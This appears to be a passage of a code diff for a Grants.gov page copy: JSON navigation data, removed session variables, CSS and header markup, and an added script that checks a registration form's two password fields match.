Grants.gov","friendlyURL":"/support/about-grants-gov","pageURL":"support/about-grants-gov","priority":0,"childCount":0,"parentName":"Support"},{"layoutId":639,"levelNumber":2,"parentLayoutId":575,"navName":"Program Management Office","friendlyURL":"/support/program-management-office","pageURL":"support/program-management-office","priority":1,"childCount":0,"parentName":"Support"},{"layoutId":629,"levelNumber":2,"parentLayoutId":575,"navName":"Grants.gov Notices","friendlyURL":"/support/grants-gov-notices","pageURL":"support/grants-gov-notices","priority":2,"childCount":0,"parentName":"Support"},{"layoutId":570,"levelNumber":2,"parentLayoutId":575,"navName":"Grants.gov Maintenance Calendar","friendlyURL":"/support/grants-gov-maintenance-calendar","pageURL":"support/grants-gov-maintenance-calendar","priority":3,"childCount":0,"parentName":"Support"},{"layoutId":616,"levelNumber":2,"parentLayoutId":575,"navName":"Grants.gov Releases","friendlyURL":"/support/grants-gov-releases","pageURL":"support/grants-gov-releases","priority":4,"childCount":0,"parentName":"Support"}],"Social Media":[{"layoutId":835,"levelNumber":3,"parentLayoutId":788,"navName":"Discussion Forum","friendlyURL":"/connect/discussion-forum","pageURL":"connect/discussion-forum","priority":1,"childCount":0,"parentName":"Social Media"}],"Applicant Registration":[{"layoutId":489,"levelNumber":3,"parentLayoutId":484,"navName":"Add Profile to Account","friendlyURL":"/applicants/applicant-registration/add-profile","pageURL":"applicants/applicant-registration/add-profile","priority":0,"childCount":0,"parentName":"Applicant Registration"},{"layoutId":813,"levelNumber":3,"parentLayoutId":484,"navName":"EBiz POC Authorizes Profile Roles","friendlyURL":"/applicants/applicant-registration/ebiz-poc-authorizes-profile-roles","pageURL":"applicants/applicant-registration/ebiz-poc-authorizes-profile-roles","priority":1,"childCount":0,"parentName":"Applicant Registration"},{"layoutId":814,"levelNumber":3,"parentLayoutId":484,"navName":"Track Profile Role Status","friendlyURL":"/applicants/applicant-registration/track-profile-role-status","pageURL":"applicants/applicant-registration/track-profile-role-status","priority":2,"childCount":0,"parentName":"Applicant Registration"}],"Connect":[{"layoutId":800,"levelNumber":2,"parentLayoutId":569,"navName":"Manage Subscriptions","friendlyURL":"/connect/manage-subscriptions/","pageURL":"connect/manage-subscriptions/","priority":0,"childCount":1,"parentName":"Connect"},{"layoutId":788,"levelNumber":2,"parentLayoutId":569,"navName":"Social Media","friendlyURL":"/connect/social-media","pageURL":"connect/social-media","priority":2,"childCount":1,"parentName":"Connect"}],"Applicant System-to-System":[{"layoutId":511,"levelNumber":3,"parentLayoutId":510,"navName":"Versions \u0026 WSDLs","friendlyURL":"/system-to-system/applicant-system-to-system/versions-wsdls","pageURL":"system-to-system/applicant-system-to-system/versions-wsdls","priority":0,"childCount":0,"parentName":"Applicant System-to-System"},{"layoutId":513,"levelNumber":3,"parentLayoutId":510,"navName":"Web Services","friendlyURL":"/system-to-system/applicant-system-to-system/web-services","pageURL":"system-to-system/applicant-system-to-system/web-services","priority":2,"childCount":11,"parentName":"Applicant System-to-System"},{"layoutId":525,"levelNumber":3,"parentLayoutId":510,"navName":"Schemas","friendlyURL":"/system-to-system/applicant-system-to-system/schemas","pageURL":"system-to-system/applicant-system-to-system/schemas","priority":3,"childCount":3,"parentName":"Applicant System-to-System"},{"layoutId":528,"levelNumber":3,"parentLayoutId":510,"navName":"Hashing","friendlyURL":"/system-to-system/applicant-system-to-system/hashing","pageURL":"system-to-system/applicant-system-to-system/hashing","priority":4,"childCount":0,"parentName":"Applicant System-to-System"},{"layoutId":529,"levelNumber":3,"parentLayoutId":510,"navName":"Certificates","friendlyURL":"/system-to-system/applicant-system-to-system/certificates","pageURL":"system-to-system/applicant-system-to-system/certificates","priority":5,"childCount":0,"parentName":"Applicant System-to-System"},{"layoutId":530,"levelNumber":3,"parentLayoutId":510,"navName":"Testing","friendlyURL":"/system-to-system/applicant-system-to-system/testing","pageURL":"system-to-system/applicant-system-to-system/testing","priority":6,"childCount":0,"parentName":"Applicant System-to-System"},{"layoutId":531,"levelNumber":3,"parentLayoutId":510,"navName":"Reference Implementation","friendlyURL":"/system-to-system/applicant-system-to-system/reference-implementation","pageURL":"system-to-system/applicant-system-to-system/reference-implementation","priority":7,"childCount":0,"parentName":"Applicant System-to-System"},{"layoutId":532,"levelNumber":3,"parentLayoutId":510,"navName":"Listserv","friendlyURL":"/system-to-system/applicant-system-to-system/listserv","pageURL":"system-to-system/applicant-system-to-system/listserv","priority":8,"childCount":0,"parentName":"Applicant System-to-System"},{"layoutId":533,"levelNumber":3,"parentLayoutId":510,"navName":"Troubleshooting","friendlyURL":"/system-to-system/applicant-system-to-system/troubleshooting","pageURL":"system-to-system/applicant-system-to-system/troubleshooting","priority":9,"childCount":0,"parentName":"Applicant System-to-System"}],"Grant Policies":[{"layoutId":661,"levelNumber":3,"parentLayoutId":640,"navName":"Who\u0027s Who in the Federal Grant Policy","friendlyURL":"/learn-grants/grant-policies/who-s-who-in-the-federal-grant-policy","pageURL":"learn-grants/grant-policies/who-s-who-in-the-federal-grant-policy","priority":0,"childCount":0,"parentName":"Grant Policies"},{"layoutId":663,"levelNumber":3,"parentLayoutId":640,"navName":"OMB Grant Memoranda","friendlyURL":"/learn-grants/grant-policies/omb-grant-memoranda","pageURL":"learn-grants/grant-policies/omb-grant-memoranda","priority":2,"childCount":0,"parentName":"Grant Policies"},{"layoutId":729,"levelNumber":3,"parentLayoutId":640,"navName":"GONE Act (2016)","friendlyURL":"/learn-grants/grant-policies/gone-act-2016","pageURL":"learn-grants/grant-policies/gone-act-2016","priority":3,"childCount":0,"parentName":"Grant Policies"},{"layoutId":664,"levelNumber":3,"parentLayoutId":640,"navName":"OMB Uniform Guidance (2014)","friendlyURL":"/learn-grants/grant-policies/omb-uniform-guidance-2014","pageURL":"learn-grants/grant-policies/omb-uniform-guidance-2014","priority":4,"childCount":0,"parentName":"Grant Policies"},{"layoutId":665,"levelNumber":3,"parentLayoutId":640,"navName":"DATA Act (2014)","friendlyURL":"/learn-grants/grant-policies/data-act-2014","pageURL":"learn-grants/grant-policies/data-act-2014","priority":5,"childCount":0,"parentName":"Grant Policies"},{"layoutId":666,"levelNumber":3,"parentLayoutId":640,"navName":"Executive Order 13576 (2011)","friendlyURL":"/learn-grants/grant-policies/executive-order-13576-2011","pageURL":"learn-grants/grant-policies/executive-order-13576-2011","priority":6,"childCount":0,"parentName":"Grant Policies"},{"layoutId":667,"levelNumber":3,"parentLayoutId":640,"navName":"Recovery Act (2009)","friendlyURL":"/learn-grants/grant-policies/recovery-act-2009","pageURL":"learn-grants/grant-policies/recovery-act-2009","priority":7,"childCount":0,"parentName":"Grant Policies"},{"layoutId":668,"levelNumber":3,"parentLayoutId":640,"navName":"FFATA Act (2006)","friendlyURL":"/learn-grants/grant-policies/ffata-act-2006","pageURL":"learn-grants/grant-policies/ffata-act-2006","priority":8,"childCount":0,"parentName":"Grant Policies"},{"layoutId":669,"levelNumber":3,"parentLayoutId":640,"navName":"Public Law 106-107 (1999)","friendlyURL":"/learn-grants/grant-policies/public-law-106-107-1999","pageURL":"learn-grants/grant-policies/public-law-106-107-1999","priority":9,"childCount":0,"parentName":"Grant Policies"},{"layoutId":670,"levelNumber":3,"parentLayoutId":640,"navName":"Single Audit Act Amendments (1996)","friendlyURL":"/learn-grants/grant-policies/single-audit-act-amendments-1996","pageURL":"learn-grants/grant-policies/single-audit-act-amendments-1996","priority":10,"childCount":0,"parentName":"Grant Policies"},{"layoutId":671,"levelNumber":3,"parentLayoutId":640,"navName":"Lobbying Disclosure Act (1995)","friendlyURL":"/learn-grants/grant-policies/lobbying-disclosure-act-1995","pageURL":"learn-grants/grant-policies/lobbying-disclosure-act-1995","priority":11,"childCount":0,"parentName":"Grant Policies"},{"layoutId":672,"levelNumber":3,"parentLayoutId":640,"navName":"Federal Grant and Cooperative Agreement Act (1977)","friendlyURL":"/learn-grants/grant-policies/federal-grant-and-cooperative-agreement-act-1977","pageURL":"learn-grants/grant-policies/federal-grant-and-cooperative-agreement-act-1977","priority":12,"childCount":0,"parentName":"Grant Policies"}],"Manage Subscriptions":[{"layoutId":857,"levelNumber":3,"parentLayoutId":800,"navName":"Newsletter Archive","friendlyURL":"/connect/manage-subscriptions/newsletter-archive","pageURL":"connect/manage-subscriptions/newsletter-archive","priority":0,"childCount":0,"parentName":"Manage Subscriptions"}],"Grant Fraud":[{"layoutId":673,"levelNumber":3,"parentLayoutId":655,"navName":"Grant Scam \u0026 Fraud Alerts","friendlyURL":"/learn-grants/grant-fraud/grant-scam-fraud-alerts","pageURL":"learn-grants/grant-fraud/grant-scam-fraud-alerts","priority":0,"childCount":0,"parentName":"Grant Fraud"},{"layoutId":674,"levelNumber":3,"parentLayoutId":655,"navName":"Grant-Related Scams","friendlyURL":"/learn-grants/grant-fraud/grant-related-scams","pageURL":"learn-grants/grant-fraud/grant-related-scams","priority":1,"childCount":0,"parentName":"Grant Fraud"},{"layoutId":675,"levelNumber":3,"parentLayoutId":655,"navName":"Grant Fraud Responsibilities","friendlyURL":"/learn-grants/grant-fraud/grant-fraud-responsibilities","pageURL":"learn-grants/grant-fraud/grant-fraud-responsibilities","priority":2,"childCount":0,"parentName":"Grant Fraud"},{"layoutId":676,"levelNumber":3,"parentLayoutId":655,"navName":"Grant Fraud Prevention","friendlyURL":"/learn-grants/grant-fraud/grant-fraud-prevention","pageURL":"learn-grants/grant-fraud/grant-fraud-prevention","priority":3,"childCount":0,"parentName":"Grant Fraud"}],"Grantors":[{"layoutId":465,"levelNumber":2,"parentLayoutId":464,"navName":"Grantor Registration","friendlyURL":"/grantors/grantor-registration","pageURL":"grantors/grantor-registration","priority":0,"childCount":0,"parentName":"Grantors"},{"layoutId":472,"levelNumber":2,"parentLayoutId":464,"navName":"Grantor Tools \u0026 Tips","friendlyURL":"/grantors/grantor-tools-tips","pageURL":"grantors/grantor-tools-tips","priority":1,"childCount":0,"parentName":"Grantors"},{"layoutId":466,"levelNumber":2,"parentLayoutId":464,"navName":"Grantor FAQs","friendlyURL":"/grantors/grantor-faqs","pageURL":"grantors/grantor-faqs","priority":2,"childCount":0,"parentName":"Grantors"},{"layoutId":473,"levelNumber":2,"parentLayoutId":464,"navName":"Grantor Standard Language","friendlyURL":"/grantors/grantor-standard-language","pageURL":"grantors/grantor-standard-language","priority":3,"childCount":0,"parentName":"Grantors"},{"layoutId":712,"levelNumber":2,"parentLayoutId":464,"navName":"Submitting UTF-8 Special Characters","friendlyURL":"/grantors/submitting-utf-8-special-characters","pageURL":"grantors/submitting-utf-8-special-characters","priority":4,"childCount":0,"parentName":"Grantors"},{"layoutId":703,"levelNumber":2,"parentLayoutId":464,"navName":"Grantor Help","friendlyURL":"/grantors/grantor-help","pageURL":"grantors/grantor-help","priority":5,"childCount":0,"parentName":"Grantors"}],"Workspace Overview":[{"layoutId":816,"levelNumber":3,"parentLayoutId":715,"navName":"Workspace Basic","friendlyURL":"/applicants/workspace-overview/workspace-basic","pageURL":"applicants/workspace-overview/workspace-basic","priority":0,"childCount":0,"parentName":"Workspace Overview"},{"layoutId":817,"levelNumber":3,"parentLayoutId":715,"navName":"Workspace Intermediate","friendlyURL":"/applicants/workspace-overview/workspace-intermediate","pageURL":"applicants/workspace-overview/workspace-intermediate","priority":1,"childCount":0,"parentName":"Workspace Overview"},{"layoutId":818,"levelNumber":3,"parentLayoutId":715,"navName":"Workspace Advanced","friendlyURL":"/applicants/workspace-overview/workspace-advanced","pageURL":"applicants/workspace-overview/workspace-advanced","priority":2,"childCount":0,"parentName":"Workspace Overview"},{"layoutId":764,"levelNumber":3,"parentLayoutId":715,"navName":"Workspace Process","friendlyURL":"/applicants/workspace-overview/workspace-process","pageURL":"applicants/workspace-overview/workspace-process","priority":3,"childCount":0,"parentName":"Workspace Overview"},{"layoutId":754,"levelNumber":3,"parentLayoutId":715,"navName":"Workspace Roles","friendlyURL":"/applicants/workspace-overview/workspace-roles","pageURL":"applicants/workspace-overview/workspace-roles","priority":4,"childCount":0,"parentName":"Workspace Overview"},{"layoutId":833,"levelNumber":3,"parentLayoutId":715,"navName":"Custom Roles","friendlyURL":"/applicants/workspace-overview/custom-roles","pageURL":"applicants/workspace-overview/custom-roles","priority":5,"childCount":0,"parentName":"Workspace Overview"}],"Grantor System-to-System":[{"layoutId":535,"levelNumber":3,"parentLayoutId":534,"navName":"Versions \u0026 WSDLs","friendlyURL":"/system-to-system/grantor-system-to-system/versions-wsdls","pageURL":"system-to-system/grantor-system-to-system/versions-wsdls","priority":0,"childCount":0,"parentName":"Grantor System-to-System"},{"layoutId":537,"levelNumber":3,"parentLayoutId":534,"navName":"Web Services","friendlyURL":"/system-to-system/grantor-system-to-system/web-services","pageURL":"system-to-system/grantor-system-to-system/web-services","priority":2,"childCount":33,"parentName":"Grantor System-to-System"},{"layoutId":550,"levelNumber":3,"parentLayoutId":534,"navName":"Schemas","friendlyURL":"/system-to-system/grantor-system-to-system/schemas","pageURL":"system-to-system/grantor-system-to-system/schemas","priority":3,"childCount":11,"parentName":"Grantor System-to-System"},{"layoutId":557,"levelNumber":3,"parentLayoutId":534,"navName":"Certificates","friendlyURL":"/system-to-system/grantor-system-to-system/certificates","pageURL":"system-to-system/grantor-system-to-system/certificates","priority":5,"childCount":0,"parentName":"Grantor System-to-System"},{"layoutId":558,"levelNumber":3,"parentLayoutId":534,"navName":"Testing","friendlyURL":"/system-to-system/grantor-system-to-system/testing","pageURL":"system-to-system/grantor-system-to-system/testing","priority":6,"childCount":0,"parentName":"Grantor System-to-System"},{"layoutId":559,"levelNumber":3,"parentLayoutId":534,"navName":"Reference Implementation","friendlyURL":"/system-to-system/grantor-system-to-system/reference-implementation","pageURL":"system-to-system/grantor-system-to-system/reference-implementation","priority":7,"childCount":0,"parentName":"Grantor System-to-System"},{"layoutId":560,"levelNumber":3,"parentLayoutId":534,"navName":"Listserv","friendlyURL":"/system-to-system/grantor-system-to-system/listserv","pageURL":"system-to-system/grantor-system-to-system/listserv","priority":8,"childCount":0,"parentName":"Grantor System-to-System"},{"layoutId":561,"levelNumber":3,"parentLayoutId":534,"navName":"Troubleshooting","friendlyURL":"/system-to-system/grantor-system-to-system/troubleshooting","pageURL":"system-to-system/grantor-system-to-system/troubleshooting","priority":9,"childCount":0,"parentName":"Grantor System-to-System"},{"layoutId":820,"levelNumber":3,"parentLayoutId":534,"navName":"RESTful APIs","friendlyURL":"/api","pageURL":"api","priority":10,"childCount":1,"parentName":"Grantor System-to-System"}],"Forms Repository":[{"layoutId":563,"levelNumber":3,"parentLayoutId":840,"navName":"R\u0026R Family","friendlyURL":"/forms/forms-repository/r-r-family","pageURL":"forms/forms-repository/r-r-family","priority":0,"childCount":0,"parentName":"Forms Repository"},{"layoutId":564,"levelNumber":3,"parentLayoutId":840,"navName":"SF-424 Family","friendlyURL":"/forms/forms-repository/sf-424-family","pageURL":"forms/forms-repository/sf-424-family","priority":1,"childCount":0,"parentName":"Forms Repository"},{"layoutId":565,"levelNumber":3,"parentLayoutId":840,"navName":"SF-424 Individual Family","friendlyURL":"/forms/forms-repository/sf-424-individual-family","pageURL":"forms/forms-repository/sf-424-individual-family","priority":2,"childCount":0,"parentName":"Forms Repository"},{"layoutId":566,"levelNumber":3,"parentLayoutId":840,"navName":"SF-424 Mandatory Family","friendlyURL":"/forms/forms-repository/sf-424-mandatory-family","pageURL":"forms/forms-repository/sf-424-mandatory-family","priority":3,"childCount":0,"parentName":"Forms Repository"},{"layoutId":567,"levelNumber":3,"parentLayoutId":840,"navName":"SF-424 Short Organization Family","friendlyURL":"/forms/forms-repository/sf-424-short-organization-family","pageURL":"forms/forms-repository/sf-424-short-organization-family","priority":4,"childCount":0,"parentName":"Forms Repository"},{"layoutId":722,"levelNumber":3,"parentLayoutId":840,"navName":"Post-Award Reporting Forms","friendlyURL":"/forms/forms-repository/post-award-reporting-forms","pageURL":"forms/forms-repository/post-award-reporting-forms","priority":5,"childCount":0,"parentName":"Forms Repository"},{"layoutId":613,"levelNumber":3,"parentLayoutId":840,"navName":"Retired Forms","friendlyURL":"/forms/forms-repository/retired-forms","pageURL":"forms/forms-repository/retired-forms","priority":6,"childCount":0,"parentName":"Forms Repository"}],"root":[{"layoutId":474,"levelNumber":1,"parentLayoutId":0,"navName":"Home","friendlyURL":"/home","pageURL":"home","priority":0,"childCount":0,"parentName":"root"},{"layoutId":763,"levelNumber":1,"parentLayoutId":0,"navName":"Learn Grants","friendlyURL":"/learn-grants","pageURL":"learn-grants","priority":1,"childCount":60,"parentName":"root"},{"layoutId":480,"levelNumber":1,"parentLayoutId":0,"navName":"Search Grants","friendlyURL":"/search-grants","pageURL":"search-grants","priority":2,"childCount":0,"parentName":"root"},{"layoutId":481,"levelNumber":1,"parentLayoutId":0,"navName":"Applicants","friendlyURL":"/applicants","pageURL":"applicants","priority":4,"childCount":18,"parentName":"root"},{"layoutId":464,"levelNumber":1,"parentLayoutId":0,"navName":"Grantors","friendlyURL":"/grantors","pageURL":"grantors","priority":5,"childCount":6,"parentName":"root"},{"layoutId":509,"levelNumber":1,"parentLayoutId":0,"navName":"System-to-System","friendlyURL":"/system-to-system","pageURL":"system-to-system","priority":6,"childCount":20,"parentName":"root"},{"layoutId":562,"levelNumber":1,"parentLayoutId":0,"navName":"Forms","friendlyURL":"/forms","pageURL":"forms","priority":7,"childCount":14,"parentName":"root"},{"layoutId":569,"levelNumber":1,"parentLayoutId":0,"navName":"Connect","friendlyURL":"/connect","pageURL":"connect","priority":8,"childCount":4,"parentName":"root"},{"layoutId":575,"levelNumber":1,"parentLayoutId":0,"navName":"Support","friendlyURL":"/support","pageURL":"support","priority":9,"childCount":6,"parentName":"root"}],"Applicants":[{"layoutId":715,"levelNumber":2,"parentLayoutId":481,"navName":"Workspace Overview","friendlyURL":"/applicants/workspace-overview","pageURL":"applicants/workspace-overview","priority":0,"childCount":6,"parentName":"Applicants"},{"layoutId":482,"levelNumber":2,"parentLayoutId":481,"navName":"Applicant Eligibility","friendlyURL":"/applicants/applicant-eligibility","pageURL":"applicants/applicant-eligibility","priority":1,"childCount":0,"parentName":"Applicants"},{"layoutId":809,"levelNumber":2,"parentLayoutId":481,"navName":"Organization Registration","friendlyURL":"/applicants/applicant-registration/organization-registration","pageURL":"applicants/applicant-registration/organization-registration","priority":2,"childCount":0,"parentName":"Applicants"},{"layoutId":484,"levelNumber":2,"parentLayoutId":481,"navName":"Applicant Registration","friendlyURL":"/applicants/applicant-registration","pageURL":"applicants/applicant-registration","priority":3,"childCount":3,"parentName":"Applicants"},{"layoutId":501,"levelNumber":2,"parentLayoutId":481,"navName":"Applicant Training","friendlyURL":"/applicants/applicant-training","pageURL":"applicants/applicant-training","priority":4,"childCount":0,"parentName":"Applicants"},{"layoutId":494,"levelNumber":2,"parentLayoutId":481,"navName":"Applicant FAQs","friendlyURL":"/applicants/applicant-faqs","pageURL":"applicants/applicant-faqs","priority":5,"childCount":0,"parentName":"Applicants"},{"layoutId":505,"levelNumber":2,"parentLayoutId":481,"navName":"Adobe Software Compatibility","friendlyURL":"/applicants/adobe-software-compatibility","pageURL":"applicants/adobe-software-compatibility","priority":9,"childCount":0,"parentName":"Applicants"},{"layoutId":711,"levelNumber":2,"parentLayoutId":481,"navName":"Submitting UTF-8 Special Characters","friendlyURL":"/applicants/submitting-utf-8-special-characters","pageURL":"applicants/submitting-utf-8-special-characters","priority":11,"childCount":0,"parentName":"Applicants"},{"layoutId":713,"levelNumber":2,"parentLayoutId":481,"navName":"Encountering Error Messages","friendlyURL":"/applicants/encountering-error-messages","pageURL":"applicants/encountering-error-messages","priority":12,"childCount":0,"parentName":"Applicants"}],"Learn Grants":[{"layoutId":644,"levelNumber":2,"parentLayoutId":763,"navName":"Grants 101","friendlyURL":"/learn-grants/grants-101","pageURL":"learn-grants/grants-101","priority":0,"childCount":5,"parentName":"Learn Grants"},{"layoutId":640,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Policies","friendlyURL":"/learn-grants/grant-policies","pageURL":"learn-grants/grant-policies","priority":1,"childCount":12,"parentName":"Learn Grants"},{"layoutId":645,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Eligibility","friendlyURL":"/learn-grants/grant-eligibility","pageURL":"learn-grants/grant-eligibility","priority":2,"childCount":0,"parentName":"Learn Grants"},{"layoutId":649,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Terminology","friendlyURL":"/learn-grants/grant-terminology","pageURL":"learn-grants/grant-terminology","priority":3,"childCount":0,"parentName":"Learn Grants"},{"layoutId":650,"levelNumber":2,"parentLayoutId":763,"navName":"Grant-Making Agencies","friendlyURL":"/learn-grants/grant-making-agencies","pageURL":"learn-grants/grant-making-agencies","priority":4,"childCount":27,"parentName":"Learn Grants"},{"layoutId":652,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Systems","friendlyURL":"/learn-grants/grant-systems","pageURL":"learn-grants/grant-systems","priority":5,"childCount":0,"parentName":"Learn Grants"},{"layoutId":653,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Programs","friendlyURL":"/learn-grants/grant-programs","pageURL":"learn-grants/grant-programs","priority":6,"childCount":0,"parentName":"Learn Grants"},{"layoutId":849,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Careers","friendlyURL":"/learn-grants/grant-careers","pageURL":"learn-grants/grant-careers","priority":7,"childCount":2,"parentName":"Learn Grants"},{"layoutId":654,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Reporting","friendlyURL":"/learn-grants/grant-reporting","pageURL":"learn-grants/grant-reporting","priority":8,"childCount":0,"parentName":"Learn Grants"},{"layoutId":655,"levelNumber":2,"parentLayoutId":763,"navName":"Grant Fraud","friendlyURL":"/learn-grants/grant-fraud","pageURL":"learn-grants/grant-fraud","priority":9,"childCount":4,"parentName":"Learn Grants"}],"System-to-System":[{"layoutId":510,"levelNumber":2,"parentLayoutId":509,"navName":"Applicant System-to-System","friendlyURL":"/system-to-system/applicant-system-to-system","pageURL":"system-to-system/applicant-system-to-system","priority":0,"childCount":23,"parentName":"System-to-System"},{"layoutId":534,"levelNumber":2,"parentLayoutId":509,"navName":"Grantor System-to-System","friendlyURL":"/system-to-system/grantor-system-to-system","pageURL":"system-to-system/grantor-system-to-system","priority":1,"childCount":54,"parentName":"System-to-System"}],"Grant Careers":[{"layoutId":850,"levelNumber":3,"parentLayoutId":849,"navName":"Grants Management","friendlyURL":"/learn-grants/grant-careers/grants-management","pageURL":"learn-grants/grant-careers/grants-management","priority":0,"childCount":0,"parentName":"Grant Careers"},{"layoutId":851,"levelNumber":3,"parentLayoutId":849,"navName":"Financial Assistance Management","friendlyURL":"/learn-grants/grant-careers/financial-assistance-management","pageURL":"learn-grants/grant-careers/financial-assistance-management","priority":1,"childCount":0,"parentName":"Grant Careers"}]}};
-var userType=1;
-var displayHeading = true;
-var subheading="";
-var landingUrl="";
-var GGUSER = false;
-var applicantIndvUserType=3;
-var applicantOrgType=4;
-var agencyType=2;
-var ebizType=1;
-var switchProfileMenu = {};
+  <script>
+    const form = document.getElementById("registration-form");
+    const password = document.getElementById("password");
+    const passwordConfirm = document.getElementById("password-confirm");
 
-var keepAlive=false;
+    form.addEventListener("submit", function (event) {
 
-var userID="";
+      if (password.value !== passwordConfirm.value) {
+        event.preventDefault();
 
-var SESSION_TIMEOUT_AJAX_URL="";
-var SESSION_TIMEOUT_WARNING_MIN=3;
-var APPLY_SESSION_UPDATER_URL="https://apply07.grants.gov/apply/sessionUpdater.jsp";
-var LOGOUT_URL="https://apply07.grants.gov/apply/Logout.faces?sto=1";
+        passwordConfirm.setCustomValidity(
+          "The passwords do not match."
+        );
 
-		</script></span>
+        passwordConfirm.reportValidity();
+      } else {
+        passwordConfirm.setCustomValidity("");
+      }
 
-    <!--  Load JavaScript from template.xhtml instead of individual component
-		&lt;script type="text/javascript" src="/apply/js/main.js"&gt;&lt;/script&gt;
-    -->
-    
-   <!--  Load Files for component library --> 
-        <link href="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.8.0/css/uswds.min.css" rel="stylesheet" type="text/css" />
-    	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.8.0/js/uswds-init.min.js"></script>
-   <!-- Load Files for component library -->
-    
-    <style type="text/css">
-	    
-	body {
-		background-color: #fff;
-	}
-	
-	.usa-media-block__body p {
-	    line-height: 1.5;
-	    font-size: 1rem;
-	    font-family: inherit;
-	}
-	
-	#wrapper {
-		border: none;
-		box-shadow: none;
-		border-radius: 0;
-		max-width: initial;
-	}
-	
-	#banner {
-		margin-left: auto;
-		margin-right: auto;
-		max-width: 64rem;
-		height: initial;
-		padding: 10px;
-		background-image: none;
-		background-repeat: repeat-x;
-		background-color: #fff;
-		border-top-left-radius: 9px;
-		border-top-right-radius: 9px;
-		-webkit-border-top-left-radius: 9px;
-		-webkit-border-top-right-radius: 9px;
-		-moz-border-top-left-radius: 9px;
-		-moz-border-top-right-radius: 9px;
-		-o-border-top-left-radius: 9px;
-		-o-border-top-right-radius: 9px;
-		-khtml-border-top-left-radius: 9px;
-		-khtml-border-top-right-radius: 9px;
-		position: relative;
-	}
-	
-	#globalnav {
-		position: relative;
-	}
-	
-	#globalnav li a:link,
-	#globalnav li a:visited {
-		font-family: Arial, Helvetica, sans-serif;
-		font-size: 14.88px;
-		text-transform: none;
-		padding: 0px 2px 0px 2px;
-		color: #71767a;
-		display: inline-block;
-		text-decoration: none;
-	}
-	
-	#globalnav li a:active,
-	#globalnav li a:hover {
-		font-size: 14.88px;
-	}
-	
-	#topnav {
-		margin-left: auto;
-		margin-right: auto;
-		max-width: 100%;
-		background-color: transparent;
-		background-image: none;
-		border-bottom: none;
-		border-top: 1px solid #dfe1e2;
-	    display: block;
-	    height: initial;
-	}
-	
-	#topnav ul li {
-		border-right: none;
-		float: none;
-	
-	}
-	
-	#topnav ul li a {
-		border-left: none;
-		border-right: none;
-		padding: 14px 15px;
-		height: initial;
-	}
-	
-	#topnav ul li a:link,
-	#topnav ul li a:visited {
-		font-size: 16px;
-		text-transform: initial;
-		color: #565c65;
-		font-weight: 700;
-	}
-	
-	#topnav ul li:active,
-	#topnav ul li:hover,
-	#topnav .selected {
-		background-color: transparent;
-		border-radius: initial;
-		box-shadow: none;
-	}
-	
-	#LearnGrants-tab :active,
-	#LearnGrants-tab :hover,
-	#LearnGrants-tab.selected {
-		background-color: transparent;
-		box-shadow: none;
-	}
-	
-	#LearnGrants-menu {
-		border: none;
-		box-shadow: none;
-		background-color: #162e51;
-	}
-	
-	.gg-megamenu .column ul li a {
-		color: #fff;
-		padding: .5rem;
-		display: block;
-	}
-	
-	.gg-megamenu .column ul li {
-		background-image: none;
-		padding: 0;
-	}
-	
-	.gg-megamenu .column ul li:hover {
-		background-image: none;
-	}
-	
-	.gg-megamenu .column h3 {
-		background-color: #1a4480;
-		color: #fff;
-		color: #fff;
-		padding: .5rem;
-		display: block;
-		margin: 0;
-	}
-	
-	.gg-megamenu {
-		padding: 0;
-	}
-	
-	.gg-megamenu .column {
-		margin: 0;
-		float: none;
-	}
-	
-	.gg-megamenu .column ul li a:hover {
-		color: #fff;
-		text-decoration: underline;
-	}
-	
-	.gig-nav {
-		width: 15rem;
-	}
-	
-	.gig-nav li {
-		width: initial;
-	}
-	
-	.gg-megamenu {
-		border-radius: 0;
-		background-color: #162e51;
-		border: none;
-	}
-	
-	.gg-megamenu .column h3 a:hover {
-		color: #fff;
-	}
-	
-	a {}
-	
-	.gg-megamenu .column h3 a {
-		color: #fff;
-	}
-	
-	#banner {
-		width: 100%;
-		position: relative;
-		display: flex;
-		justify-content: space-between;
-		align-items: center;
-	}
-	
-	#logo {
-		float: none;
-		display: inline-block;
-		width: auto;
-		margin: 1.3rem 0;
-	}
-	
-	#globalwidget {
-		float: none;
-		width: auto;
-	}
-	
-	#topnav ul {
-		min-width: 970px;
-		display: block;
-		width: 100%;
-		margin-left: auto;
-		margin-right: auto;
-		max-width: 64rem;
-	}
-	
-	#topnav2 a {
-	    font-size: initial;
-	}
-
-	#topnav2 {
-		min-height: 46.3906px;
-	}
-			
-	.inactiveLink {
-	   pointer-events: none;
-	   cursor: default;
-	}		
-    </style>
-    
-	<a href="#content" id="skip-to-content"></a>
-	<div class="usa-overlay"></div>
-	<header class="usa-header usa-header--extended">
-		<div class="usa-navbar">
-		    <div class="usa-logo-slim">
-		      <em class="usa-logo__text">
-		      	<div id="logo">
-					<a href="/"><img src="./images/grants-gov-logo-text.png" width="245" height="78" border="0" alt="Click for Home" /></a>
-				</div>
-		      </em>
-		    </div>
-  		</div>
-  		<nav aria-label="Primary navigation" class="usa-nav">
-	  		<div class="usa-nav__inner">
-	  			<button type="button" class="usa-nav__close">
-		        	<img src="/assets/img/usa-icons/close.svg" role="img" alt="Close" />
-		      	</button>
-		      	<!-- &lt;ul class="usa-nav__primary usa-accordion"&gt; -->
-		      		<div id="topnav2"></div>
-		      		<div class="usa-nav__secondary">
-					<div id="globalwidget">
-						<div id="globalnav"></div>
-						<div id="switchProfilePanel" class="gridscrollable" style="display: none;"></div>
-
-						<div id="agencyPanel" style="margin-top: 5px; text-align: right;">
-						</div>
-						<!-- 
-						&lt;form name="globalsearch" id="globalsearch"&gt;
-							&lt;table cellpadding="0" cellspacing="0" summary="Global Search"&gt;
-								&lt;tr&gt;
-									&lt;td&gt;&lt;span&gt;&lt;LABEL style="font-weight: normal"
-											for="jumpMenu"&gt;Search:&lt;/LABEL&gt;&lt;/span&gt;&lt;/td&gt;
-									&lt;td&gt;&lt;select name="jumpMenu" id="jumpMenu"
-										title="Select type of search"&gt;
-											&lt;option value="search-grants"&gt;Grant Opportunities&lt;/option&gt;
-											&lt;option value="search-site"&gt;Site Content&lt;/option&gt;
-									&lt;/select&gt;&lt;/td&gt;
